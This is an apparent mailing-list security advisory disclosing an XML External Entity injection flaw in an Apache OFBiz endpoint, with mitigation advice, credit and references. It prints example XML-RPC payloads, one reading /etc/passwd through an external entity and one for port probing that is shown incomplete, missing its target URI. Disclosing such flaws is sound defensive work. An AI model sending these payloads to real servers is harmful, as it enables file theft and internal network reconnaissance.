This endpoint is exposed to External Entity Injection by passing DOCTYPE declarations with executable  payloads that discloses the contents of files in the filesystem. In addition, it can  also be used to probe for open network ports, and figure out from returned error messages whether a file exists or not.  Mitigation: Upgrade to or manually apply the following commits on branch 16  Example: # Payload to find an exposed port <?xml version="1.0"?> <!DOCTYPE x SYSTEM <methodCall>      <methodName>ping</methodName> </methodCall>  # Payload to display file contents <?xml version="1.0"?> <!DOCTYPE foo [ <!ENTITY disclose SYSTEM "file:///etc/passwd"> ]> <methodCall>      <methodName>&disclose;</methodName> </methodCall>  Credit: James Parfet <jamesp at mindpointgroup.com>  References: http://ofbiz.apache.org/download.html#vulnerabilities   Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.
